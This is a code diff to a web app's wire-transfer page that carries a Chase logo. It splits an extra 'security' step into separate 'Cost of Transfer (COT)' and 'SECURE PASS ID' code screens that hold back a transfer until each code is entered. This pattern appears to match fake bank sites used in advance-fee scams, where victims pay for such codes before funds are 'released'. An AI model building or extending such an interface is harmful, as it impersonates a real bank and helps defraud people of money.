@@ -14,7 +14,7 @@ import {
 import ChaseLogo from "@/components/ChaseLogo";
 import { InputOTP, InputOTPGroup, InputOTPSlot } from "@/components/ui/input-otp";
 
-type TransferStep = "details" | "review" | "pin" | "security" | "success";
+type TransferStep = "details" | "review" | "pin" | "cot" | "secure_id" | "success";
 
 const US_BANKS = [
   "JPMorgan Chase", "Bank of America", "Wells Fargo", "Citibank",
@@ -95,8 +95,10 @@ const Transfer = () => {
 
   const handlePinSubmit = () => {
     if (pin.length !== 4) return;
-    if (cotActive || secureIdActive) {
-      setStep("security");
+    if (cotActive) {
+      setStep("cot");
+    } else if (secureIdActive) {
+      setStep("secure_id");
     } else {
       executeTransfer();
     }
@@ -150,8 +152,11 @@ const Transfer = () => {
   };
 
   // ─── Progress indicator ───────────────────────────────────────────────────
-  const steps: TransferStep[] = ["details", "review", "pin", "success"];
-  const stepIndex = steps.indexOf(step === "security" ? "pin" : step);
+  const displayStepIndex =
+    step === "details" ? 0 :
+      step === "review" ? 1 :
+        step === "success" ? 3 : 2; // pin, cot, secure_id all map to 2 (Authorize)
+
 
   return (
     <div className="min-h-screen bg-[#f4f6f9] flex flex-col">
@@ -180,9 +185,9 @@ const Transfer = () => {
               <div key={label} className="flex-1">
                 <div className={cn(
                   "h-1.5 rounded-full transition-all duration-300",
-                  i <= stepIndex - (step === "security" ? 1 : 0) ? "bg-white" : "bg-white/30"
+                  i <= displayStepIndex ? "bg-white" : "bg-white/30"
                 )} />
-                <p className={cn("text-[10px] mt-1 text-center font-medium", i <= stepIndex ? "text-white" : "text-white/50")}>{label}</p>
+                <p className={cn("text-[10px] mt-1 text-center font-medium", i <= displayStepIndex ? "text-white" : "text-white/50")}>{label}</p>
               </div>
             ))}
           </div>
@@ -365,40 +370,77 @@ const Transfer = () => {
           </div>
         )}
 
-        {/* ──────── Step 3b: Security ──────── */}
-        {step === "security" && (
-          <div className="space-y-4 pt-4">
-            <SectionCard title="Additional Security Check" icon={<ShieldCheck className="w-4 h-4 text-[#0E76C7]" />}>
-              <p className="text-sm text-gray-500 mb-4">Your account has additional security layers enabled. Please provide the required codes to proceed.</p>
-              {cotActive && (
-                <div className="space-y-1.5 mb-4">
-                  <label className="text-xs font-semibold text-gray-500 uppercase tracking-wide">COT Code</label>
-                  <input
-                    type="password" value={cotCodeInput} onChange={e => setCotCodeInput(e.target.value)}
-                    placeholder="Enter COT Code"
-                    className="w-full px-4 py-3 rounded-xl border border-gray-200 text-sm focus:outline-none focus:ring-2 focus:ring-[#0E76C7]/30 focus:border-[#0E76C7] bg-white"
-                  />
-                </div>
-              )}
-              {secureIdActive && (
-                <div className="space-y-1.5">
-                  <label className="text-xs font-semibold text-gray-500 uppercase tracking-wide">Secure ID Code</label>
-                  <input
-                    type="password" value={secureIdInput} onChange={e => setSecureIdInput(e.target.value)}
-                    placeholder="Enter Secure ID"
-                    className="w-full px-4 py-3 rounded-xl border border-gray-200 text-sm focus:outline-none focus:ring-2 focus:ring-[#0E76C7]/30 focus:border-[#0E76C7] bg-white"
-                  />
-                </div>
-              )}
+        {/* ──────── Step 3b: COT Code ──────── */}
+        {step === "cot" && (
+          <div className="space-y-4 pt-4 animate-in fade-in slide-in-from-right-4 duration-300">
+            <SectionCard title="Secondary Authentication (COT)" icon={<ShieldCheck className="w-4 h-4 text-red-600" />}>
+              <div className="p-3 bg-red-50 rounded-xl border border-red-100 mb-4">
+                <p className="text-xs text-red-700 font-medium leading-relaxed">
+                  Authentication level 1: A Cost of Transfer (COT) code is required to authorize this transaction.
+                </p>
+              </div>
+
+              <div className="space-y-1.5">
+                <label className="text-xs font-semibold text-gray-500 uppercase tracking-wide">COT Code</label>
+                <input
+                  type="text" value={cotCodeInput} onChange={e => setCotCodeInput(e.target.value)}
+                  placeholder="Enter COT Code"
+                  className="w-full px-4 py-3 rounded-xl border border-gray-200 text-sm focus:outline-none focus:ring-2 focus:ring-red-600/20 focus:border-red-600 bg-white font-mono tracking-widest"
+                />
+              </div>
             </SectionCard>
+
             <div className="flex gap-3">
-              <button onClick={() => setStep("pin")} className="flex-1 py-4 rounded-2xl border-2 border-gray-200 font-semibold text-gray-600 hover:bg-gray-50">Back</button>
+              <button
+                onClick={() => setStep("pin")}
+                className="flex-1 py-4 rounded-2xl border-2 border-gray-200 font-semibold text-gray-600 hover:bg-gray-50"
+              >
+                Back
+              </button>
+              <button
+                onClick={() => secureIdActive ? setStep("secure_id") : executeTransfer()}
+                disabled={loading || !cotCodeInput}
+                className="flex-2 flex-1 py-4 bg-[#0E76C7] text-white font-bold rounded-2xl hover:bg-[#0f6ab5] disabled:opacity-50 flex items-center justify-center gap-2 shadow-lg shadow-[#0E76C7]/25"
+              >
+                {loading ? <Loader2 className="w-4 h-4 animate-spin" /> : <>Continue <ArrowRight className="w-4 h-4" /></>}
+              </button>
+            </div>
+          </div>
+        )}
+
+        {/* ──────── Step 3c: Secure ID ──────── */}
+        {step === "secure_id" && (
+          <div className="space-y-4 pt-4 animate-in fade-in slide-in-from-right-4 duration-300">
+            <SectionCard title="Final Authentication (SECURE PASS)" icon={<Lock className="w-4 h-4 text-[#0E76C7]" />}>
+              <div className="p-3 bg-blue-50 rounded-xl border border-blue-100 mb-4">
+                <p className="text-xs text-[#0E76C7] font-medium leading-relaxed">
+                  Authentication level 2: Please provide your SECURE PASS ID CODE to complete the wire transfer.
+                </p>
+              </div>
+
+              <div className="space-y-1.5">
+                <label className="text-xs font-semibold text-gray-500 uppercase tracking-wide">SECURE ID CODE</label>
+                <input
+                  type="text" value={secureIdInput} onChange={e => setSecureIdInput(e.target.value)}
+                  placeholder="Enter Secure ID"
+                  className="w-full px-4 py-3 rounded-xl border border-gray-200 text-sm focus:outline-none focus:ring-2 focus:ring-[#0E76C7]/20 focus:border-[#0E76C7] bg-white font-mono tracking-widest"
+                />
+              </div>
+            </SectionCard>
+
+            <div className="flex gap-3">
+              <button
+                onClick={() => cotActive ? setStep("cot") : setStep("pin")}
+                className="flex-1 py-4 rounded-2xl border-2 border-gray-200 font-semibold text-gray-600 hover:bg-gray-50"
+              >
+                Back
+              </button>
               <button
                 onClick={executeTransfer}
-                disabled={loading || (cotActive && !cotCodeInput) || (secureIdActive && !secureIdInput)}
-                className="flex-1 py-4 bg-[#0E76C7] text-white font-bold rounded-2xl hover:bg-[#0f6ab5] disabled:opacity-50 flex items-center justify-center gap-2 shadow-lg shadow-[#0E76C7]/25"
+                disabled={loading || !secureIdInput}
+                className="flex-2 flex-1 py-4 bg-[#0E76C7] text-white font-bold rounded-2xl hover:bg-[#0f6ab5] disabled:opacity-50 flex items-center justify-center gap-2 shadow-lg shadow-[#0E76C7]/25"
               >
-                {loading ? <><Loader2 className="w-4 h-4 animate-spin" /> Verifying...</> : "Send Wire"}
+                {loading ? <><Loader2 className="w-4 h-4 animate-spin" /> Verifying...</> : "Authorize Release"}
               </button>
             </div>
           </div>
